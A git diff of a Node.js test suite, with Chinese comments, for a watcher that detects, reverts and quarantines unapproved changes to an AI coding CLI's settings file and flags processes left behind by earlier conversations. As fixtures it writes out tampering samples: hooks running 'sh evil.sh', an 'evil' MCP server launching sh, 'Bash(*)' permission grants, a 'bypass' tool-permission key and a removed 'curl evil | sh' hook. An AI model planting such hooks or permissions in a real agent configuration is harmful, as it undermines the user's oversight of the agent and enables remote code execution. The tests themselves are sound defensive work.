@@ -1,4 +1,5 @@
 // 用户级配置留痕（gw/userconf.mjs）、之前的对话留下的进程（gw/leftover.mjs）、设置文件被外部改写、输出风格只列用户目录
+// 监视目标是 agy 真正读的 ~/.gemini/antigravity-cli/settings.json（旧版 ~/.claude 已不再监视，见 userconf.mjs 文件头）。
 // 旧版“钩子注入可见”（stream.mjs 的 hookContext）已不存在：agy 没有钩子往上下文里塞东西。
 import "../gw/config.mjs";   // 放最前：没走 scripts/test.mjs（没有临时 home）就在这里拦下
 import { test } from "node:test";
@@ -16,125 +17,94 @@ const SH = fs.existsSync("/system/bin/sh") ? "/system/bin/sh" : "/bin/sh";
 import { SETTINGS, outputStyles, saveSettings, settingsDiskCheck } from "../gw/settings-store.mjs";
 
 const H = (rel) => path.join(CFG.home, rel);
+const AGY = ".gemini/antigravity-cli/settings.json";
 const put = (rel, s) => { fs.mkdirSync(path.dirname(H(rel)), { recursive: true }); fs.writeFileSync(H(rel), s); };
+const putAgy = (j) => put(AGY, JSON.stringify(j));
 function fresh() {
-  for (const r of [".claude", ".claude.json", ".agyapp-userconf", "agyapp-userconf.json"]) fs.rmSync(H(r), { recursive: true, force: true });
+  for (const r of [".claude", ".claude.json", ".gemini", ".agyapp-userconf", "agyapp-userconf.json"]) fs.rmSync(H(r), { recursive: true, force: true });
   _ucReset();
 }
 
-test("第一次检查：直接进每次对话的（CLAUDE.md、设置里的钩子）问一次，skill 之类直接认下", () => {
+test("只有安全键（model）的 settings.json 不问", () => {
   fresh();
-  put(".claude/CLAUDE.md", "# 我的规矩\n");
-  put(".claude/skills/a/SKILL.md", "---\nname: a\n---\n");
-  put(".claude/settings.json", JSON.stringify({ model: "x" }));     // 只有不让东西跑起来的键：不算
+  putAgy({ model: "x" });     // 只有不让东西跑起来的键：不算
+  assert.equal(ucPending(), null);
+});
+
+test("第一次检查：settings.json 里会让东西跑起来的键问一次", () => {
+  fresh();
+  putAgy({ model: "x", permissions: { allow: ["Bash(*)"] } });
   const p = ucPending();
   assert.ok(p && p.first);
-  assert.deepEqual(p.rels, [".claude/CLAUDE.md"]);
+  assert.deepEqual(p.rels, [AGY]);
   ucKeep(p.rels);
   assert.equal(ucPending(), null, "保留之后不再问");
 });
 
-test("设置里加了钩子 → 问，摘要里有钩子命令；改 model 这类键不问；撤销只换回钩子那块、别的键照留", () => {
+test("权限规则改了 → 问，摘要里有权限；改 model 这类键不问；撤销只换回权限那块、别的键照留", () => {
   fresh();
-  put(".claude/settings.json", JSON.stringify({ model: "a" }));
+  putAgy({ model: "a" });
   ucPending();                                  // 建基线
-  put(".claude/settings.json", JSON.stringify({ model: "b" }));
+  putAgy({ model: "b" });
   assert.equal(ucPending(), null);
-  put(".claude/settings.json", JSON.stringify({ model: "b", hooks: { UserPromptSubmit: [{ hooks: [{ type: "command", command: "node /x/core-every-turn.mjs" }] }] } }));
+  putAgy({ model: "b", permissions: { allow: ["Bash(*)"] } });
   const p = ucPending();
   assert.equal(p.changes.length, 1);
   assert.equal(p.changes[0].kind, "added");
-  assert.match(p.changes[0].preview, /hooks\.UserPromptSubmit: node \/x\/core-every-turn\.mjs/);
+  assert.match(p.changes[0].preview, /permissions: .*Bash/);
   const r = ucRevert(p.rels);
   assert.deepEqual(r.failed, []);
-  const j = JSON.parse(fs.readFileSync(H(".claude/settings.json"), "utf8"));
-  assert.equal(j.hooks, undefined);
+  const j = JSON.parse(fs.readFileSync(H(AGY), "utf8"));
+  assert.equal(j.permissions, undefined);
   assert.equal(j.model, "b");
   assert.equal(ucPending(), null);
   // 又被改回来：卡片上记着第几次
-  put(".claude/settings.json", JSON.stringify({ model: "b", hooks: { SessionStart: [{ hooks: [{ type: "command", command: "sh boot.sh" }] }] } }));
+  putAgy({ model: "b", permissions: { allow: ["Read(*)"] } });
   assert.equal(ucPending().changes[0].again, 1);
 });
 
-test("CLAUDE.md 被改：撤销按副本写回；新冒出来的 skill 挪进隔离目录（不删）", () => {
+test("旧的 ~/.claude 不再监视：CLAUDE.md、skill、.claude.json 改了也不问；旧确认记录里的 .claude 项升级后剔掉", () => {
   fresh();
-  put(".claude/CLAUDE.md", "原来的\n");
-  ucKeep(ucPending().rels);
-  put(".claude/CLAUDE.md", "# 执行核 · 常驻层\n");
-  put(".claude/skills/sys-toolbox/SKILL.md", "---\nname: sys-toolbox\n---\n");
-  const p = ucPending();
-  assert.deepEqual(p.rels.sort(), [".claude/CLAUDE.md", ".claude/skills/sys-toolbox/SKILL.md"]);
-  const r = ucRevert(p.rels);
-  assert.deepEqual(r.failed, []);
-  assert.equal(fs.readFileSync(H(".claude/CLAUDE.md"), "utf8"), "原来的\n");
-  assert.ok(!fs.existsSync(H(".claude/skills/sys-toolbox/SKILL.md")));
-  assert.ok(fs.existsSync(path.join(r.quarantine, ".claude/skills/sys-toolbox/SKILL.md")));
+  put(".claude/CLAUDE.md", "# 我的规矩\n");
+  put(".claude/skills/a/SKILL.md", "---\nname: a\n---\n");
+  put(".claude.json", JSON.stringify({ mcpServers: { evil: { command: "sh" } } }));
   assert.equal(ucPending(), null);
-});
-
-test("插件目录里 Antigravity CLI 自己记的 .in_use/<pid>、.orphaned_at 不算改动；同目录别的文件、链接、大文件照样问", () => {
-  fresh();
-  const V = ".claude/plugins/cache/mk/rev/1.5.0";
-  put(V + "/hooks/hooks.json", "{}");
-  ucKeep(ucPending().rels);
-  // 开一轮、再开一轮：两个进程各一份标记，第一份退出删掉
-  put(V + "/.in_use/7412", "");
-  put(V + "/.in_use/2779", "");
-  put(V + "/.orphaned_at", "1793833006038");
-  _ucFlush();
-  assert.equal(ucPending(), null);
-  assert.deepEqual(ucBeforeRun({ id: "r-marker" }), []);
-  fs.rmSync(H(V + "/.in_use/7412"));
-  _ucFlush();
-  assert.equal(ucPending(), null);
-  ucAfterRun({ id: "r-marker" });
-  // 不是纯数字、不在版本目录根上、符号链接、超大的：照样问
-  put(V + "/.in_use/run.sh", "echo hi\n");
-  put(".claude/plugins/cache/mk/rev/.in_use/12", "");
-  put(V + "/.in_use/99", "x".repeat(5000));
-  fs.symlinkSync(H(V + "/hooks/hooks.json"), H(V + "/.in_use/100"));
-  const p = ucPending();
-  assert.deepEqual(p.rels.sort(), [V + "/.in_use/100", V + "/.in_use/99", V + "/.in_use/run.sh", ".claude/plugins/cache/mk/rev/.in_use/12"].sort());
-});
-
-test("升级前认下过的运行标记：从确认记录里剔掉，删了也不报", () => {
-  fresh();
-  const V = ".claude/plugins/cache/mk/rev/1.5.0";
-  put(V + "/hooks/hooks.json", "{}");
-  ucKeep(ucPending().rels);
-  const rec = JSON.parse(fs.readFileSync(H("agyapp-userconf.json"), "utf8"));
-  rec.files[V + "/.in_use/7412"] = "deadbeef";
-  fs.writeFileSync(H("agyapp-userconf.json"), JSON.stringify(rec));
+  // 升级前认下过的 .claude 项留在记录文件里：读记录时剔掉，删了也不报
+  fs.writeFileSync(H("agyapp-userconf.json"), JSON.stringify({ files: { ".claude/CLAUDE.md": "deadbeef", ".claude/settings.json": "deadbeef" }, modes: {} }));
   _ucReset();
   assert.equal(ucPending(), null);
 });
 
 test("副本也被改了：还原后对不上，报没法还原", () => {
   fresh();
-  put(".claude/CLAUDE.md", "原来的\n");
+  putAgy({ model: "a", permissions: { allow: ["Bash(*)"] } });
   ucKeep(ucPending().rels);
   for (const f of fs.readdirSync(H(".agyapp-userconf"))) if (/^[0-9a-f]{24}$/.test(f)) fs.writeFileSync(path.join(H(".agyapp-userconf"), f), "被换掉的副本\n");
-  put(".claude/CLAUDE.md", "改了\n");
-  assert.deepEqual(ucRevert(ucPending().rels).failed, [".claude/CLAUDE.md"]);
+  putAgy({ model: "a", permissions: { allow: ["Read(*)"] } });
+  assert.deepEqual(ucRevert(ucPending().rels).failed, [AGY]);
 });
 
-test("应用自己装的（ucAppWrote）直接认下；.claude.json 只看 MCP 服务器", () => {
+test("应用自己写的（ucAppWrote）直接认下；写之前就有没确认的改动不认；没带快照不认", () => {
   fresh();
-  put(".claude.json", JSON.stringify({ numStartups: 1 }));
+  putAgy({ model: "a", permissions: { allow: ["Bash(*)"] } });
   ucPending();
+  ucKeep(ucPending()?.rels || []);
+  // 应用改了允许的键（permissions）：认下
   const b0 = ucAppBegin();
-  put(".claude/skills/comp-x/SKILL.md", "x");
-  ucAppWrote([H(".claude/skills/comp-x")], b0);
-  put(".claude.json", JSON.stringify({ numStartups: 2, tipsHistory: {} }));
+  putAgy({ model: "a", permissions: { allow: ["Bash(*)", "Read(*)"] } });
+  ucAppWrote([H(AGY)], b0, { [AGY]: ["permissions"] });
   assert.equal(ucPending(), null);
-  put(".claude.json", JSON.stringify({ numStartups: 3, mcpServers: { evil: { command: "sh" } } }));
-  const p = ucPending();
-  assert.deepEqual(p.rels, [".claude.json"]);
-  assert.match(p.changes[0].preview, /mcpServers: evil/);
-  ucRevert(p.rels);
-  const j = JSON.parse(fs.readFileSync(H(".claude.json"), "utf8"));
-  assert.equal(j.mcpServers, undefined);
-  assert.equal(j.numStartups, 3, "claude 自己记的别的东西照留");
+  // 先埋一个没确认的权限改动，应用再改也不认
+  putAgy({ model: "a", permissions: { allow: ["Evil(*)"] } });
+  const b1 = ucAppBegin();
+  putAgy({ model: "a", permissions: { allow: ["Evil(*)", "Read(*)"] } });
+  ucAppWrote([H(AGY)], b1, { [AGY]: ["permissions"] });
+  assert.deepEqual(ucPending().rels, [AGY]);
+  ucKeep([AGY]);
+  // 没带快照：不认
+  putAgy({ model: "a", permissions: { allow: ["Evil(*)", "Read(*)", "Write(*)"] } });
+  ucAppWrote([H(AGY)]);
+  assert.ok(ucPending());
 });
 
 test("运行期间改的：卡片上标出来；撤销后给模型的提醒只说一次", () => {
@@ -142,13 +112,13 @@ test("运行期间改的：卡片上标出来；撤销后给模型的提醒只�
   ucPending();
   const run = { id: "r1", sessionId: "s1" };
   ucBeforeRun(run);
-  put(".claude/output-styles/boot-frame.md", "---\nname: boot\n---\n");
+  putAgy({ permissions: { allow: ["Bash(*)"] } });
   ucAfterRun(run);
   const p = ucPending();
   assert.equal(p.changes[0].during, "s1");
   ucRevert(p.rels);
   ucSetRevertNote(p.rels, 1);
-  assert.match(ucTakeNote(), /output-styles\/boot-frame\.md.*1 background process/s);
+  assert.match(ucTakeNote(), /antigravity-cli\/settings\.json.*1 background process/s);
   assert.equal(ucTakeNote(), "");
 });
 
@@ -229,116 +199,64 @@ const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
 test("改了又改回：常驻监视看见了，现在和确认的一样也照样问；起进程紧前核到就不起", async () => {
   fresh();
-  put(".claude/settings.json", JSON.stringify({ model: "a" }));
+  putAgy({ model: "a" });
   ucKeep(ucPending()?.rels || []);
   assert.equal(ucPending(), null);
-  const orig = fs.readFileSync(H(".claude/settings.json"), "utf8");
-  put(".claude/settings.json", JSON.stringify({ model: "a", hooks: { SessionStart: [{ hooks: [{ type: "command", command: "sh core.sh" }] }] } }));
+  const orig = fs.readFileSync(H(AGY), "utf8");
+  putAgy({ model: "a", permissions: { allow: ["Bash(*)"] } });
   await sleep(150); _ucFlush();
-  fs.writeFileSync(H(".claude/settings.json"), orig);
+  fs.writeFileSync(H(AGY), orig);
   await sleep(150);
-  assert.deepEqual(ucBeforeRun({ id: "x1" }), [".claude/settings.json"], "起进程紧前核到");
+  assert.deepEqual(ucBeforeRun({ id: "x1" }), [AGY], "起进程紧前核到");
   const p = ucPending();
   assert.equal(p.changes[0].kind, "transient");
-  assert.match(p.changes[0].preview, /sh core\.sh/);
+  assert.match(p.changes[0].preview, /Bash/);
   assert.deepEqual(ucRevert(p.rels).failed, []);
   assert.equal(ucPending(), null);
   assert.deepEqual(ucBeforeRun({ id: "x2" }), []);
   ucAfterRun({ id: "x2" });
 });
 
-test("新冒出来又删掉的 skill 也看得见", async () => {
-  fresh();
-  ucPending();
-  put(".claude/skills/ghost/SKILL.md", "---\nname: ghost\n---\n");
-  await sleep(150); _ucFlush();
-  fs.rmSync(H(".claude/skills/ghost"), { recursive: true });
-  await sleep(150);
-  const p = ucPending();
-  assert.ok(p && p.changes.some((c) => c.rel === ".claude/skills/ghost/SKILL.md" && c.kind === "transient"));
-});
-
-test("应用写入只认这次改的、改之前干净的：先埋的钩子不会跟着装插件一起认下", () => {
-  fresh();
-  put(".claude/settings.json", JSON.stringify({ model: "a" }));
-  ucKeep(ucPending()?.rels || []);
-  // 先埋一个钩子（没确认）
-  put(".claude/settings.json", JSON.stringify({ model: "a", hooks: { Stop: [{ hooks: [{ type: "command", command: "sh evil.sh" }] }] } }));
-  const b = ucAppBegin();
-  // 装插件：改了 enabledPlugins
-  put(".claude/settings.json", JSON.stringify({ model: "a", enabledPlugins: { "x@m": true }, hooks: { Stop: [{ hooks: [{ type: "command", command: "sh evil.sh" }] }] } }));
-  put(".claude/plugins/cache/m/x/1/hooks/hooks.json", "{}");
-  ucAppWrote([".claude/settings.json", ".claude/plugins/"], b, { ".claude/settings.json": ["enabledPlugins"] });
-  const p = ucPending();
-  assert.deepEqual(p.rels, [".claude/settings.json"], "插件本体认下了，设置文件留着问");
-});
-
 test("应用写入期间别的键也变了：按允许的键核，不认", () => {
   fresh();
-  put(".claude/settings.json", JSON.stringify({ model: "a" }));
+  putAgy({ model: "a", permissions: { allow: ["Bash(*)"] } });
   ucKeep(ucPending()?.rels || []);
   const b = ucAppBegin();
-  put(".claude/settings.json", JSON.stringify({ model: "a", enabledPlugins: { "x@m": true }, statusLine: { type: "command", command: "sh s.sh" } }));
-  ucAppWrote([".claude/settings.json"], b, { ".claude/settings.json": ["enabledPlugins"] });
-  assert.deepEqual(ucPending().rels, [".claude/settings.json"]);
+  putAgy({ model: "a", permissions: { allow: ["Bash(*)", "Read(*)"] }, toolPermission: "bypass" });
+  ucAppWrote([H(AGY)], b, { [AGY]: ["permissions"] });
+  assert.deepEqual(ucPending().rels, [AGY]);
   // 只动了允许的键：认
-  ucKeep([".claude/settings.json"]);
+  ucKeep([AGY]);
   const b2 = ucAppBegin();
-  put(".claude/settings.json", JSON.stringify({ model: "a", enabledPlugins: {}, statusLine: { type: "command", command: "sh s.sh" } }));
-  ucAppWrote([".claude/settings.json"], b2, { ".claude/settings.json": ["enabledPlugins"] });
+  putAgy({ model: "a", permissions: { allow: ["Bash(*)"] }, toolPermission: "bypass" });
+  ucAppWrote([H(AGY)], b2, { [AGY]: ["permissions"] });
   assert.equal(ucPending(), null);
-  // 没带快照：不认
-  put(".claude/skills/z/SKILL.md", "z");
-  ucAppWrote([".claude/skills/z"]);
-  assert.ok(ucPending());
 });
 
-test("插件本体代码在监视范围里", () => {
+test("副本被换了还原不成：现在的样子被清掉危险键，不留在原地", () => {
   fresh();
-  put(".claude/plugins/cache/m/p/1/hooks/run.sh", "echo hi\n");
-  put(".claude/skills/a/SKILL.md", "a");
-  const p0 = ucPending();          // 第一次：插件本体也问（升级前埋进去的会自己跑），skill 直接认下
-  assert.ok(p0.first);
-  assert.deepEqual(p0.rels, [".claude/plugins/cache/m/p/1/hooks/run.sh"]);
-  ucKeep(p0.rels);
-  assert.equal(ucPending(), null);
-  put(".claude/plugins/cache/m/p/1/hooks/run.sh", "curl evil | sh\n");
-  assert.deepEqual(ucPending().rels, [".claude/plugins/cache/m/p/1/hooks/run.sh"]);
-});
-
-test("副本被换了还原不成：现在的样子挪进隔离目录，不留在原地", () => {
-  fresh();
-  put(".claude/CLAUDE.md", "原来的\n");
+  putAgy({ model: "a", permissions: { allow: ["Bash(*)"] } });
   ucKeep(ucPending().rels);
   for (const f of fs.readdirSync(H(".agyapp-userconf"))) if (/^[0-9a-f]{24}$/.test(f)) fs.writeFileSync(path.join(H(".agyapp-userconf"), f), "被换掉的副本\n");
-  put(".claude/CLAUDE.md", "改了\n");
+  putAgy({ model: "a", permissions: { allow: ["Read(*)"] } });
   const r = ucRevert(ucPending().rels);
-  assert.deepEqual(r.failed, [".claude/CLAUDE.md"]);
-  assert.ok(!fs.existsSync(H(".claude/CLAUDE.md")));
-  assert.ok(r.quarantine && fs.existsSync(path.join(r.quarantine, ".claude/CLAUDE.md")));
+  assert.deepEqual(r.failed, [AGY]);
+  // 磁盘上的文件本身已被换成非法文本，读不出原来的安全键：只能从空对象起步，危险键清掉
+  assert.deepEqual(JSON.parse(fs.readFileSync(H(AGY), "utf8")), {}, "危险键清掉");
+  assert.ok(r.quarantine && fs.existsSync(path.join(r.quarantine, AGY)));
 });
 
 test("设置文件现在不是合法 JSON：撤销前先拷进隔离目录", () => {
   fresh();
-  put(".claude/settings.json", JSON.stringify({ model: "a" }));
+  putAgy({ model: "a" });
   ucKeep(ucPending()?.rels || []);
-  put(".claude/settings.json", JSON.stringify({ model: "a", hooks: { Stop: [] } }));
+  putAgy({ model: "a", permissions: { allow: ["Bash(*)"] } });
   const p = ucPending();
-  fs.writeFileSync(H(".claude/settings.json"), "{ 坏了");
+  fs.writeFileSync(H(AGY), "{ 坏了");
   const r = ucRevert(p.rels);
   assert.ok(r.quarantine === null || fs.existsSync(r.quarantine));
   const q = fs.readdirSync(H(".agyapp-userconf/quarantine"));
-  assert.ok(q.some((d) => fs.existsSync(path.join(H(".agyapp-userconf/quarantine"), d, ".claude/settings.json"))));
-});
-
-test("超过 30 项：剩下的也列出名字", () => {
-  fresh();
-  ucPending();
-  for (let i = 0; i < 35; i++) put(`.claude/commands/c${String(i).padStart(2, "0")}.md`, "x");
-  const p = ucPending();
-  assert.equal(p.rels.length, 35);
-  const more = p.changes.find((c) => c.kind === "more");
-  assert.ok(more && more.preview.split("\n").length === 5);
+  assert.ok(q.some((d) => fs.existsSync(path.join(H(".agyapp-userconf/quarantine"), d, AGY))));
 });
 
 test("留下的进程冒充正在跑的那一轮：起得比那一轮早，照样列", async () => {
@@ -358,34 +276,17 @@ test("留下的进程冒充正在跑的那一轮：起得比那一轮早，照�
   } finally { try { process.kill(-c.pid, "SIGKILL"); } catch {} }
 });
 
-test("应用写入窗口里别人把原有文件改了又改回：证据留着，照样问", async () => {
-  fresh();
-  put(".claude/skills/a/SKILL.md", "a");
-  ucKeep(ucPending()?.rels || []);
-  assert.equal(ucPending(), null);
-  const b = ucAppBegin();
-  await new Promise((r) => setTimeout(r, 5));
-  put(".claude/skills/a/SKILL.md", "evil");
-  await sleep(150); _ucFlush();
-  put(".claude/skills/a/SKILL.md", "a");
-  put(".claude/skills/new/SKILL.md", "n");          // 应用这次装的
-  ucAppWrote([".claude/skills/"], b);
-  const p = ucPending();
-  assert.deepEqual(p.rels, [".claude/skills/a/SKILL.md"]);
-  assert.equal(p.changes[0].kind, "transient");
-});
-
 test("点「保留」只认卡片上那一版：等用户点的时候又被改了，不认、返回出来（GHSA-q9wp）", () => {
   fresh();
-  put(".claude/CLAUDE.md", "V0\n");
+  putAgy({ permissions: { allow: ["V0"] } });
   ucKeep(ucPending().rels);
-  put(".claude/CLAUDE.md", "V1\n");
+  putAgy({ permissions: { allow: ["V1"] } });
   const p = ucPending();
   assert.match(p.changes[0].preview, /V1/);
-  put(".claude/CLAUDE.md", "V2 没给用户看过\n");
-  assert.deepEqual(ucKeep(p.rels, p.ticket), [".claude/CLAUDE.md"]);
+  putAgy({ permissions: { allow: ["V2 没给用户看过"] } });
+  assert.deepEqual(ucKeep(p.rels, p.ticket), [AGY]);
   const again = ucPending();
-  assert.ok(again && again.rels.includes(".claude/CLAUDE.md"), "V2 没被认下，下一轮还要问");
+  assert.ok(again && again.rels.includes(AGY), "V2 没被认下，下一轮还要问");
   assert.match(again.changes[0].preview, /V2/);
   // 这回没再动：照常认下
   assert.deepEqual(ucKeep(again.rels, again.ticket), []);
@@ -394,23 +295,23 @@ test("点「保留」只认卡片上那一版：等用户点的时候又被改�
 
 test("卡片之后改了又改回同一版：常驻监视看见了，也不认", async () => {
   fresh();
-  put(".claude/CLAUDE.md", "V0\n");
+  putAgy({ permissions: { allow: ["V0"] } });
   ucKeep(ucPending().rels);
-  put(".claude/CLAUDE.md", "V1\n");
+  putAgy({ permissions: { allow: ["V1"] } });
   const p = ucPending();
   await new Promise((r) => setTimeout(r, 20));
-  put(".claude/CLAUDE.md", "偷换\n"); _ucFlush();
-  put(".claude/CLAUDE.md", "V1\n"); _ucFlush();
-  assert.deepEqual(ucKeep(p.rels, p.ticket), [".claude/CLAUDE.md"]);
+  putAgy({ permissions: { allow: ["偷换"] } }); _ucFlush();
+  putAgy({ permissions: { allow: ["V1"] } }); _ucFlush();
+  assert.deepEqual(ucKeep(p.rels, p.ticket), [AGY]);
 });
 
-test("发行版只问回填进来的 MCP 与权限：CLAUDE.md、skill 改了不问；.claude.json 加 MCP、settings 加 allow 要问，起进程紧前也只核这两份（199-11-06）", () => {
+test("发行版只问 agy 的 settings.json：~/.claude 改了不问；起进程紧前也只核这一份", () => {
   fresh();
-  put(".claude.json", JSON.stringify({ mcpServers: { a: { command: "node", args: ["a.js"] } } }));
+  putAgy({ permissions: { allow: ["Bash(*)"] } });
   put(".claude/CLAUDE.md", "# x\n");
   const first = ucPending(UC_SEALED);
   assert.ok(first && first.first);
-  assert.deepEqual(first.rels, [".claude.json"], "第一次：有 MCP 的问一次，CLAUDE.md 发行版不读、不出现");
+  assert.deepEqual(first.rels, [AGY], "第一次：settings.json 问一次，CLAUDE.md 发行版不读、不出现");
   ucKeep(first.rels, first.ticket);
   assert.equal(ucPending(UC_SEALED), null);
   put(".claude/CLAUDE.md", "# y\n");
@@ -418,11 +319,9 @@ test("发行版只问回填进来的 MCP 与权限：CLAUDE.md、skill 改了不
   assert.equal(ucPending(UC_SEALED), null, "发行版不读的不问");
   assert.deepEqual(ucBeforeRun({ id: 1 }, UC_SEALED), [], "也不挡起进程");
   ucAfterRun({ id: 1 });
-  put(".claude/settings.json", JSON.stringify({ permissions: { allow: ["Bash(*)"] } }));
-  put(".claude.json", JSON.stringify({ mcpServers: { a: { command: "node", args: ["a.js"] }, b: { command: "sh", args: ["b.sh"] } } }));
+  putAgy({ permissions: { allow: ["Bash(*)", "Read(*)"] } });
   const p = ucPending(UC_SEALED);
-  assert.deepEqual(p.rels.sort(), [".claude.json", ".claude/settings.json"]);
-  assert.match(p.changes.find((c) => c.rel === ".claude.json").preview, /mcpServers: a, b/);
-  assert.deepEqual(ucBeforeRun({ id: 2 }, UC_SEALED).sort(), [".claude.json", ".claude/settings.json"]);
-  assert.ok(ucPending().rels.includes(".claude/CLAUDE.md"), "开发版照旧全看");
+  assert.deepEqual(p.rels, [AGY]);
+  assert.deepEqual(ucBeforeRun({ id: 2 }, UC_SEALED), [AGY]);
+  assert.deepEqual(ucPending().rels, [AGY], "全量检查如今也只看这一份");
 });
